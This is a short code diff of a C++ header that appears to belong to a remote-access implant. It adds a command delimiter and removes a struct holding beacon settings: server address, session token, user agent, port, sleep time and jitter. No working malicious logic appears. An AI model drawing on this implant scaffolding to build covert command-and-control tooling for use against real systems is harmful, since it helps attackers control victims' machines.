@@ -11,6 +11,8 @@
 #define FREE_HEAP_BUFFER(BUFFER) if(BUFFER != nullptr){HeapFree(GetProcessHeap(), 0, BUFFER);}
 
 #define SIZE_OF_PAGE     0x1000
+#define COMMAND_DELIMITER '!'
+
 #define PAGE_ALIGN(x)    (((uint64_t)x) + ((SIZE_OF_PAGE - (((uint64_t)x) & (SIZE_OF_PAGE - 1))) % SIZE_OF_PAGE))
 #define PTR_TO_U64(ptr)  reinterpret_cast<uint64_t>(ptr)
 #define INT_TO_U64(x)    static_cast<uint64_t>(x)
@@ -30,17 +32,6 @@
 FIELD_OFFSET( IMAGE_NT_HEADERS, OptionalHeader ) +                      \
 ((ntheader))->FileHeader.SizeOfOptionalHeader                           \
 ))
-
-struct implant_context {
-    std::string server_addr;
-    std::string session_token;
-    std::string callback_object;
-    std::string user_agent;
-    uint16_t port;
-    bool is_https;
-    uint64_t sleep_time; //milliseconds
-    uint64_t jitter;
-};
 
 template<typename T>
 class defer_wrapper {
